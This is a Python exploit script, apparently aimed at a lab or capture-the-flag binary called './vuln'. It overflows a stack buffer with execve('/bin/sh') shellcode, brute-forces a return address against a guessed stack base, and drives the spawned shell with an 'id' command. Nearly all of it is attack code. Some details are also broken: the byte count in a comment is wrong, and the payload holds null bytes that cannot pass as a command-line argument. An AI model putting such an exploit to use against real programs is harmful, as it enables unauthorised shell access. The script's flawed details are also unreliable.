#!/usr/bin/env python3
import os, subprocess, struct, sys, time

# 64‑bit execve("/bin/sh") shellcode (27 bytes)
shellcode = (
    b"\x48\x31\xd2"                      # xor    rdx,rdx
    b"\x48\x31\xf6"                      # xor    rsi,rsi
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # movabs rdi,0x68732f6e69622f
    b"\x57"                              # push   rdi
    b"\x48\x89\xe7"                      # mov    rdi,rsp
    b"\xb0\x3b"                          # mov    al,0x3b
    b"\x0f\x05"                          # syscall
)

# Pad to 64 bytes (size of dest)
payload = shellcode.ljust(64, b"\x90")   # NOP sled

# Overwrite src and saved rbp (8 bytes each)
payload += b"B"*8 + b"C"*8

# Placeholder for return address
payload += b"\x00"*8

def run(arg_bytes):
    # Convert raw bytes to a string that can be passed to execve
    arg_str = arg_bytes.decode('latin-1')
    proc = subprocess.Popen(
        ["./vuln", arg_str],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    try:
        out, err = proc.communicate(timeout=2)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, err = proc.communicate()
    return out, err, proc.returncode

# Get a rough stack base guess (typical for this container)
base_guess = 0x7fffffffde00

found = False
for off in range(0, 0x2000, 0x100):
    ret = base_guess + off
    test = payload[:-8] + struct.pack("<Q", ret)
    out, _, rc = run(test)
    if rc == 0:          # program exited normally → likely hit our code
        print("[+] Possible ret address:", hex(ret))
        found = True
        break

if not found:
    print("[-] Could not find a working return address.")
    sys.exit(1)

# Final exploit
final_payload = payload[:-8] + struct.pack("<Q", ret)
final_arg = final_payload.decode('latin-1')
proc = subprocess.Popen(
    ["./vuln", final_arg],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

# Give shell a moment to spawn
time.sleep(0.5)

# Test the shell
proc.stdin.write("id\n")
proc.stdin.flush()
print(proc.stdout.readline())
print(proc.stdout.readline())